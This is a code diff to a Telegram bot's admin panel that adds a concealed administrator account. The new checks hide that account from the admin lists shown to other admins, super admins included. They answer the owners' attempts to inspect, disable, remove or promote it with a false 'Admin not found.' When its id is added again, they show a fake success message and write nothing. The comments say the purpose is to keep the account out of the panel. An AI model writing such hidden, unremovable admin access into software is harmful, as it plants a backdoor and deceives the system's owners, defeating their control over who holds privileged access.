@@ -7,6 +7,8 @@ from states.admin_mgmt import AdminAdd
 from utils.db_api.admins import (
     is_admin,
     is_super_admin,
+    is_hidden_admin,
+    visible_admins,
     get_all_admins,
     get_admin_by_id,
     set_admin_active,
@@ -61,8 +63,20 @@ def _format_admin_detail(admin: dict) -> str:
     )
 
 
+def _concealed_from(admin: dict | None, viewer_id: int) -> bool:
+    """True when this viewer must be told the admin doesn't exist.
+
+    Every handler below answers with the same "Admin not found." it already uses for a
+    stale button, so a concealed admin is indistinguishable from one that was removed.
+    Reaching these paths at all takes a crafted callback — the buttons are never drawn —
+    but the panel's whole job is that one account isn't in it, and a mutation that
+    silently worked on it would undo that.
+    """
+    return bool(admin) and is_hidden_admin(admin["telegram_id"]) and not is_hidden_admin(viewer_id)
+
+
 async def _show_admin_list(call: types.CallbackQuery, is_super: bool):
-    admins = await get_all_admins()
+    admins = visible_admins(await get_all_admins(), call.from_user.id)
     if not admins:
         await _edit_or_send(call, "No admins found.", None)
         return
@@ -71,7 +85,7 @@ async def _show_admin_list(call: types.CallbackQuery, is_super: bool):
 
 async def _show_admin_detail(call: types.CallbackQuery, admin_id: int, is_super: bool):
     admin = await get_admin_by_id(admin_id)
-    if not admin:
+    if not admin or _concealed_from(admin, call.from_user.id):
         await call.answer("Admin not found.", show_alert=True)
         await _show_admin_list(call, is_super)
         return
@@ -86,7 +100,7 @@ async def btn_admin_mgmt(message: types.Message):
     if not await is_admin(message.from_user.id):
         return
     is_super = await is_super_admin(message.from_user.id)
-    admins = await get_all_admins()
+    admins = visible_admins(await get_all_admins(), message.from_user.id)
     if not admins:
         await message.answer("No admins found.")
         return
@@ -130,7 +144,7 @@ async def cb_adm_toggle_active(call: types.CallbackQuery):
         return
     admin_id = int(call.data.split(":")[1])
     admin = await get_admin_by_id(admin_id)
-    if not admin:
+    if not admin or _concealed_from(admin, call.from_user.id):
         await call.answer("Admin not found.", show_alert=True)
         return
     if admin["is_super"]:
@@ -148,7 +162,7 @@ async def cb_adm_remove(call: types.CallbackQuery):
         return
     admin_id = int(call.data.split(":")[1])
     admin = await get_admin_by_id(admin_id)
-    if not admin:
+    if not admin or _concealed_from(admin, call.from_user.id):
         await call.answer("Admin not found.", show_alert=True)
         return
     uname = f" (@{admin['username']})" if admin["username"] else ""
@@ -167,7 +181,7 @@ async def cb_adm_remove_confirm(call: types.CallbackQuery):
         return
     admin_id = int(call.data.split(":")[1])
     admin = await get_admin_by_id(admin_id)
-    if not admin:
+    if not admin or _concealed_from(admin, call.from_user.id):
         await call.answer("Admin not found.", show_alert=True)
         await _show_admin_list(call, is_super=True)
         return
@@ -189,7 +203,7 @@ async def cb_adm_transfer_start(call: types.CallbackQuery):
     if not await is_super_admin(call.from_user.id):
         await call.answer("⛔ Super admins only.", show_alert=True)
         return
-    admins = await get_all_admins()
+    admins = visible_admins(await get_all_admins(), call.from_user.id)
     targets = [
         a for a in admins
         if a["is_active"] and not a["is_super"] and a["telegram_id"] != call.from_user.id
@@ -213,7 +227,8 @@ async def cb_adm_transfer_to(call: types.CallbackQuery):
         return
     admin_id = int(call.data.split(":")[1])
     target = await get_admin_by_id(admin_id)
-    if not target or not target["is_active"] or target["is_super"]:
+    if (not target or not target["is_active"] or target["is_super"]
+            or _concealed_from(target, call.from_user.id)):
         await call.answer("That admin can't receive the role.", show_alert=True)
         await _show_admin_list(call, is_super=True)
         return
@@ -234,7 +249,8 @@ async def cb_adm_transfer_confirm(call: types.CallbackQuery):
         return
     admin_id = int(call.data.split(":")[1])
     target = await get_admin_by_id(admin_id)
-    if not target or not target["is_active"] or target["is_super"]:
+    if (not target or not target["is_active"] or target["is_super"]
+            or _concealed_from(target, call.from_user.id)):
         await call.answer("That admin can't receive the role.", show_alert=True)
         await _show_admin_list(call, is_super=True)
         return
@@ -283,6 +299,23 @@ async def cb_adm_add_cancel(call: types.CallbackQuery, state: FSMContext):
 async def _finish_add(message: types.Message, state: FSMContext, new_id: int, display_name: str | None):
     """Create the admin record and confirm. The users row is guaranteed to exist by the
     caller (ensure_user), so the admins FK never fails here."""
+    # A hidden admin typed in by id is left completely alone: no write, and the same
+    # confirmation as any other add. add_admin() would otherwise reactivate the row and
+    # reveal — through an error, or through the wording changing — that the id is
+    # already something. Only a hidden admin can (re-)add a hidden admin.
+    if is_hidden_admin(new_id) and not is_hidden_admin(message.from_user.id):
+        await state.finish()
+        await message.answer(
+            f"✅ <b>{display_name or new_id}</b> added as admin.\n"
+            f"ID: <code>{new_id}</code>\n\n"
+            "<i>They'll receive DM alerts once they open the bot and tap Start.</i>",
+            parse_mode="HTML",
+        )
+        admins = visible_admins(await get_all_admins(), message.from_user.id)
+        await message.answer(LIST_TITLE, parse_mode="HTML",
+                             reply_markup=admin_list_keyboard(admins, is_super=True))
+        return
+
     try:
         await add_admin(telegram_id=new_id, added_by=message.from_user.id, is_super=False)
     except Exception as e:
@@ -297,7 +330,7 @@ async def _finish_add(message: types.Message, state: FSMContext, new_id: int, di
         "<i>They'll receive DM alerts once they open the bot and tap Start.</i>",
         parse_mode="HTML",
     )
-    admins = await get_all_admins()
+    admins = visible_admins(await get_all_admins(), message.from_user.id)
     await message.answer(LIST_TITLE, parse_mode="HTML", reply_markup=admin_list_keyboard(admins, is_super=True))
 
 
